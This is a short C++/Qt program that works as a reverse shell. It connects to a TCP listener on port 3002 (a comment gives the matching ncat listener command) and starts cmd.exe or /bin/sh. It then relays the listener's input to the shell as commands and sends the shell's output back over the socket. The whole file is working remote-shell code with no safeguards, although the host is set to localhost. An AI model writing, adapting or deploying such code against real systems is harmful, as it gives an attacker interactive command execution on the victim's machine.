#include <QApplication>
#include <QTcpSocket>
#include <QProcess>
#include <QThread>
#include <iostream>

QString getProgramPath()
{
#ifdef Q_OS_WIN
	return "cmd.exe";
#else
	const QFileInfo shell("/bin/sh");
	if (!shell.exists())
	{
		const QFileInfo bash("/bin/bash");
		if (!bash.exists())
		{
			qDebug() << "shell not found, please write down the shell path before running this snippet";
			return "";
		}

		return bash.absoluteFilePath();
	}

	return shell.absoluteFilePath();
#endif
}

int main(int argc, char* argv[])
{
	// ncat -kvvl 3002
	QApplication a(argc, argv);
	auto sock = new QTcpSocket();


	sock->connectToHost("localhost", 3002);

	while (!sock->waitForConnected())
	{
	}

	QProcess process;
	const QString program = getProgramPath();

	if (program.isEmpty())
		return 1;

	// Merge StdErr with StdOut
	process.setProcessChannelMode(QProcess::MergedChannels);

	// Start Process
	process.start(program);
	// process.waitForStarted();

	// When we have something from the server, pipe it to process
	QObject::connect(sock, &QTcpSocket::readyRead, [&]()
	{
		const QByteArray command = sock->readAll();

		if (command.endsWith('\n'))
			process.write(command);
		else
			process.write((command + "\r\n"));

		process.waitForBytesWritten();

		/*
		if (command.trimmed() == "exit")
		{
			sock->close();
			a.exit(0);
		}
		*/
	});

	// WHen we have something from process pipe it to socket
	QObject::connect(&process, &QProcess::readyRead, [&]()
	{
		const QByteArray processOut = process.readAll();
		sock->write(processOut);
		sock->waitForBytesWritten();
	});

	// Exit app and close socket
	QObject::connect(&process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
	                 [&](int exitCode, QProcess::ExitStatus /*exitStatus*/)
	                 {
		                 sock->close();
		                 a.exit(exitCode);
	                 });


	return a.exec();
}
